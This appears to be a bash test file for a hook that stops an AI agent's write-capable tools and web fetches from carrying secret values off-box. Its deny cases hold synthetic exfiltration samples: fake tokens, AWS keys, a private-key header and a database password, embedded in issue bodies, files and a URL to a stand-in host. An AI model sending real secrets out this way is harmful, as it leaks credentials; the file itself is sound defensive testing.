#!/bin/bash
# Tests for outbound secret-VALUE egress scanning (#22): a write-capable MCP
# tool (or WebFetch URL) must not carry a secret value off-box. Read-capable
# MCP tools are NOT scanned (a reference passed to a reader is not exfiltration).
#
# Usage: bash tests/hooks/test_egress.sh

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=tests/hooks/helpers.sh
source "${SCRIPT_DIR}/helpers.sh"

echo ""
echo "========================================="
echo " Egress value-scan (check-sensitive.sh)"
echo "========================================="

echo ""
echo -e "${YELLOW}#22: write-capable MCP tools must not send secret values${NC}"

# trunk-ignore-begin(shellcheck/SC2312): jq -n produces static JSON, return value irrelevant
expect_deny_json "github issue_write body w/ 1pw reference" \
  "$(jq -n '{tool_name:"mcp__github__issue_write", tool_input:{title:"t", body:"see op://vault/item/field"}}')"
expect_deny_json "github add_issue_comment w/ priv-key header" \
  "$(jq -n '{tool_name:"mcp__github__add_issue_comment", tool_input:{body:"-----BEGIN PRIVATE KEY-----"}}')"
expect_deny_json "drive create_file w/ google oauth token" \
  "$(jq -n '{tool_name:"mcp__claude_ai_Google_Drive__create_file", tool_input:{content:"ya29.a0AfH6SMBexampletokenvalue"}}')"
expect_deny_json "asana create_tasks w/ gh token" \
  "$(jq -n '{tool_name:"mcp__claude_ai_Asana__create_tasks", tool_input:{html_notes:"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn"}}')"
expect_deny_json "WebFetch url carrying a 1pw reference" \
  "$(jq -n '{tool_name:"WebFetch", tool_input:{url:"https://x.example/?u=op://vault/i/f"}}')"

echo ""
echo -e "${YELLOW}#22: read-capable tools and benign writes still allowed${NC}"

# read-capable MCP tool: a reference passed in is not exfiltration → allow
expect_allow_json "dagster get_run arg w/ 1pw reference (read tool)" \
  "$(jq -n '{tool_name:"mcp__dagster__get_run", tool_input:{runId:"op://vault/i/f"}}')"
expect_allow_json "github issue_write benign body" \
  "$(jq -n '{tool_name:"mcp__github__issue_write", tool_input:{title:"t", body:"normal description text"}}')"
expect_allow_json "WebFetch benign url" \
  "$(jq -n '{tool_name:"WebFetch", tool_input:{url:"https://example.com/docs/guide"}}')"
# trunk-ignore-end(shellcheck/SC2312)

echo ""
echo -e "${YELLOW}#3/I6: more secret shapes + merge/delete write verbs${NC}"

# trunk-ignore-begin(shellcheck/SC2312): jq -n static JSON, return value irrelevant
expect_deny_json "issue_write body w/ postgres conn string" \
  "$(jq -n '{tool_name:"mcp__github__issue_write", tool_input:{title:"t", body:"postgres://admin:s3cret@db.example.com:5432/prod"}}')"
expect_deny_json "drive create_file w/ service_account JSON" \
  "$(jq -n '{tool_name:"mcp__claude_ai_Google_Drive__create_file", tool_input:{content:"{\"type\": \"service_account\", \"project_id\": \"x\"}"}}')"
expect_deny_json "asana create_tasks w/ AWS access key id" \
  "$(jq -n '{tool_name:"mcp__claude_ai_Asana__create_tasks", tool_input:{html_notes:"AKIAIOSFODNN7EXAMPLE"}}')"
# newly-synced patterns (#5/I6): Slack / Stripe / Slack-webhook / contextual AWS secret.
# Split string literals so gitleaks' source scan doesn't flag the synthetic tokens.
expect_deny_json "issue_write w/ Slack bot token" \
  "$(jq -n --arg b "xoxb-2401234567-""2409876543210-AbCdEfGhIjKlMnOpQrStUvWx" '{tool_name:"mcp__github__issue_write", tool_input:{body:$b}}')"
expect_deny_json "issue_write w/ Stripe live key" \
  "$(jq -n --arg b "sk_live""_4eC39HqLyjWDarjtT1zdp7dc0000abcd" '{tool_name:"mcp__github__issue_write", tool_input:{body:$b}}')"
expect_deny_json "issue_write w/ Slack webhook URL" \
  "$(jq -n --arg b "https://hooks.slack.com/services/""T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX" '{tool_name:"mcp__github__issue_write", tool_input:{body:$b}}')"
expect_deny_json "issue_write w/ aws_secret_access_key assignment" \
  "$(jq -n '{tool_name:"mcp__github__issue_write", tool_input:{body:"aws_secret_access_key=wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEYAB"}}')"
# write-verb name coverage: merge / delete are gated too
expect_deny_json "merge_pull_request w/ 1pw reference (merge verb)" \
  "$(jq -n '{tool_name:"mcp__github__merge_pull_request", tool_input:{commit_message:"see op://vault/item/field"}}')"
expect_deny_json "asana delete_task w/ 1pw reference (delete verb)" \
  "$(jq -n '{tool_name:"mcp__claude_ai_Asana__delete_task", tool_input:{note:"op://vault/item/field"}}')"
# trunk-ignore-end(shellcheck/SC2312)

print_summary "Egress value-scan"
